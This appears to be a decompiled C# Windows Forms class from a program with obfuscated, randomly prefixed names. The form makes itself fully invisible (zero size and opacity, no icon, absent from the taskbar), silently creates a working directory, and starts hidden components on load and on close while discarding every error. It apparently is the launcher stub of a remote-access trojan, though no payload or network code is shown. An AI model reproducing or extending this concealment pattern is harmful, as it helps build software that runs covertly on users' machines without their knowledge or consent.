using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace sohirmnvrs;

public class Form2 : Form
{
	private sohirmnvrsMCDM sohirmnvrsmainvp = new sohirmnvrsMCDM();

	private IContainer components = null;

	public Form2()
	{
		InitializeComponent();
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_ShowIcon(false);
			((Control)this).set_Visible(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			if (!Directory.Exists(sohirmnvrsCONF.sohirmnvrsget_mpath()))
			{
				Directory.CreateDirectory(sohirmnvrsCONF.sohirmnvrsget_mpath());
			}
			sohirmnvrsmainvp.sohirmnvrsdo_start();
		}
		catch
		{
		}
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Thread.Sleep(10);
			sohirmnvrsmainvp.sohirmnvrsload_app();
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form2");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form2");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
	}
}
